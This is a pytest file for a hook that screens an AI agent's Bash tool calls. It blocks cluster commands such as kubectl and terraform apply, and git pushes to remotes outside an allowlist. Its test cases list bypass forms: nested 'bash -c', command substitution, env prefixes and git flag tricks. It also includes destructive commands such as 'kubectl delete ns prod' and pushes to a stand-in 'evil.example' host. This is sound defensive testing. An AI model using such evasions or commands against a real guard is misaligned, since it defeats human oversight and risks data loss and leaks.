"""Unit tests for the guard's analyzer (charter C-1/C-5).

tests/governance/test_pretooluse_guard.py drives the real bash wrapper end to
end — that is the integration proof. These tests exercise the classification
logic directly, so a tokenizer regression is diagnosed in milliseconds and at
the level it occurred, instead of as a rc=0 from a subprocess.
"""

from __future__ import annotations

import io
from pathlib import Path

import pytest

from orbital_drift import guard


@pytest.fixture
def allowlist(tmp_path: Path) -> Path:
    path = tmp_path / "allowed-remotes.txt"
    path.write_text(
        "# charter C-5 / DEC-003\nhttps://github.com/ianshank/Orbital-Drift.git\n",
        encoding="utf-8",
    )
    return path


def _blocked(command: str, allowlist: Path, *, remote: str = "") -> guard.Verdict:
    return guard.analyze(command, allowlist=allowlist, effective_remote=remote)


# --- segmentation ----------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("a && b", {"a", "b"}),
        ("a || b", {"a", "b"}),
        ("a ; b", {"a", "b"}),
        ("a | b", {"a", "b"}),
        ("a & b", {"a", "b"}),
        ("a\nb", {"a", "b"}),
        # Substitution bodies are lifted into their own segments: this is the
        # class of bypass the regex tokenizer could not see at all.
        ("echo $(kubectl get pods)", {"echo", "kubectl get pods"}),
        ("echo `kubectl get pods`", {"echo", "kubectl get pods"}),
        ("a $(b $(c))", {"a", "b", "c"}),
    ],
)
def test_split_segments(command: str, expected: set[str]) -> None:
    assert set(guard.split_segments(command)) >= expected


def test_parameter_expansion_is_data_not_a_command() -> None:
    """${VAR} expands to a value; it is not a nested command line."""
    assert "VAR" not in " ".join(guard.split_segments("echo ${VAR}"))


# --- classification --------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "kubectl get pods",
        "argo list",
        "argocd app list",
        "k3s kubectl get nodes",
        "k9s",
        "/usr/local/bin/kubectl apply -f x",
        "sudo kubectl apply -f x",
        "env KUBECONFIG=/tmp/c kubectl apply -f x",
        "FOO=1 BAR=2 kubectl apply -f x",
        "xargs kubectl delete pod",
    ],
)
def test_always_denied_commands_block(command: str, allowlist: Path) -> None:
    verdict = _blocked(command, allowlist)
    assert verdict.blocked and verdict.constraint == "C-1", verdict


@pytest.mark.parametrize(
    "command",
    [
        "helm install r ./c",
        "helm upgrade r ./c",
        "helm get values r",
        "terraform apply",
        "terraform plan",
        "terraform init",  # no -backend=false: initializes a real backend
        "kustomize build overlays/prod",
    ],
)
def test_conditional_commands_block_outside_readonly_forms(command: str, allowlist: Path) -> None:
    verdict = _blocked(command, allowlist)
    assert verdict.blocked and verdict.constraint == "C-1", verdict


@pytest.mark.parametrize(
    "command",
    [
        "helm template ./chart",
        "helm template . --set a=b",
        "helm lint ./chart",
        "terraform validate",
        "terraform fmt -check",
        "terraform init -backend=false",
        "pytest -q",
        "git status",
        "ls -la",
    ],
)
def test_permitted_commands_allow(command: str, allowlist: Path) -> None:
    assert not _blocked(command, allowlist).blocked


def test_unparseable_segment_fails_closed(allowlist: Path) -> None:
    verdict = _blocked('echo "unterminated', allowlist)
    assert verdict.blocked
    assert "tokenize" in verdict.reason


# --- shell -c recursion ----------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        'bash -c "kubectl apply -f x"',
        "sh -c 'terraform apply'",
        "bash -c \"sh -c 'kubectl delete ns prod'\"",
        'zsh -c "helm install r ./c"',
    ],
)
def test_shell_dash_c_payloads_are_analyzed_as_code(command: str, allowlist: Path) -> None:
    assert _blocked(command, allowlist).blocked


def test_shell_dash_c_with_safe_payload_allows(allowlist: Path) -> None:
    assert not _blocked('bash -c "pytest -q"', allowlist).blocked


def test_deep_nesting_refuses_rather_than_recursing(allowlist: Path) -> None:
    command = "echo hi"
    for _ in range(guard._MAX_DEPTH + 2):
        command = f'bash -c "{command}"'
    verdict = guard.analyze(command, allowlist=allowlist, _depth=guard._MAX_DEPTH + 1)
    assert verdict.blocked


# --- git push destinations -------------------------------------------------


def test_allowlisted_push_allows(allowlist: Path) -> None:
    assert not _blocked(
        "git push https://github.com/ianshank/Orbital-Drift.git main", allowlist
    ).blocked


def test_unlisted_push_blocks(allowlist: Path) -> None:
    verdict = _blocked("git push https://evil.example/x.git main", allowlist)
    assert verdict.blocked and verdict.constraint == "C-5"


@pytest.mark.parametrize(
    "command",
    [
        "git -C /somewhere push evil main",
        "git --exec-path=/usr/lib push evil",
        "git -c user.name=x push evil",
    ],
)
def test_flag_bearing_push_forms_are_still_checked(command: str, allowlist: Path) -> None:
    """Every one of these was measured ALLOWED by the regex implementation."""
    verdict = _blocked(command, allowlist)
    assert verdict.blocked and verdict.constraint == "C-5", verdict


def test_bare_push_uses_the_effective_remote(allowlist: Path) -> None:
    allowed = _blocked(
        "git push", allowlist, remote="https://github.com/ianshank/Orbital-Drift.git"
    )
    assert not allowed.blocked
    denied = _blocked("git push", allowlist, remote="https://evil.example/x.git")
    assert denied.blocked


def test_bare_push_with_no_resolvable_remote_blocks(allowlist: Path) -> None:
    """Never assume `origin`: assuming a default is how a push to an
    off-allowlist remote.pushDefault was measured to pass."""
    verdict = _blocked("git push", allowlist, remote="")
    assert verdict.blocked and verdict.constraint == "C-5"


def test_push_flags_are_skipped_when_finding_the_destination(allowlist: Path) -> None:
    verdict = _blocked("git push --force-with-lease https://evil.example/x.git main", allowlist)
    assert verdict.blocked and verdict.constraint == "C-5"


def test_missing_allowlist_fails_closed(tmp_path: Path) -> None:
    verdict = _blocked(
        "git push https://github.com/ianshank/Orbital-Drift.git", tmp_path / "no.txt"
    )
    assert verdict.blocked and verdict.constraint == "C-5"


def test_non_push_git_commands_allow(allowlist: Path) -> None:
    for command in ("git status", "git commit -m 'x'", "git -C /tmp log --oneline"):
        assert not _blocked(command, allowlist).blocked, command


def test_quoted_mention_is_data(allowlist: Path) -> None:
    """A quoted string reaching `git commit -m` is data; the identical string
    reaching `bash -c` is code and blocks (see the -c tests above)."""
    assert not _blocked('git commit -m "kubectl apply -f x.yaml"', allowlist).blocked


def test_verdict_renders_its_constraint(allowlist: Path) -> None:
    verdict = _blocked("kubectl apply -f x", allowlist)
    assert verdict.render().startswith("BLOCKED (C-1)")
    assert guard.Verdict(False).render() == "ALLOW"


# --- main(): the CLI boundary ----------------------------------------------
#
# The bash wrapper is covered end-to-end by tests/governance, but coverage.py
# cannot see a subprocess-spawned interpreter, so main()'s branches are
# exercised directly here too.


def _payload(command: str) -> str:
    import json

    return json.dumps({"tool_name": "Bash", "tool_input": {"command": command}})


def test_main_allows_benign(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("pytest -q")))
    assert guard.main(["--allowlist", str(allowlist)]) == 0
    assert capsys.readouterr().err == ""


def test_main_blocks_and_names_the_constraint(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("kubectl apply -f x")))
    assert guard.main(["--allowlist", str(allowlist)]) == 2
    assert "BLOCKED (C-1)" in capsys.readouterr().err


def test_main_empty_command_allows(allowlist: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("")))
    assert guard.main(["--allowlist", str(allowlist)]) == 0


def test_main_unanalyzable_dangerous_payload_fails_closed(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO("not json -- kubectl delete ns prod"))
    assert guard.main(["--allowlist", str(allowlist)]) == 2
    assert "unanalyzable payload" in capsys.readouterr().err


def test_main_unanalyzable_benign_payload_allows(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO("not json -- echo hello"))
    assert guard.main(["--allowlist", str(allowlist)]) == 0


def test_main_debug_traces_segments(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("echo a && echo b")))
    assert guard.main(["--allowlist", str(allowlist), "--debug"]) == 0
    assert "guard: segment=" in capsys.readouterr().err


def test_main_passes_the_effective_remote_through(
    allowlist: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("git push")))
    blocked = guard.main(["--allowlist", str(allowlist), "--effective-remote", "https://evil/x"])
    assert blocked == 2
    monkeypatch.setattr("sys.stdin", io.StringIO(_payload("git push")))
    allowed = guard.main(
        [
            "--allowlist",
            str(allowlist),
            "--effective-remote",
            "https://github.com/ianshank/Orbital-Drift.git",
        ]
    )
    assert allowed == 0


def test_segment_queue_has_a_work_ceiling(allowlist: Path) -> None:
    """A pathological input must terminate rather than spin."""
    pathological = "$(" * 200 + "echo hi" + ")" * 200
    assert isinstance(guard.split_segments(pathological), list)
    assert guard.analyze(pathological, allowlist=allowlist) is not None
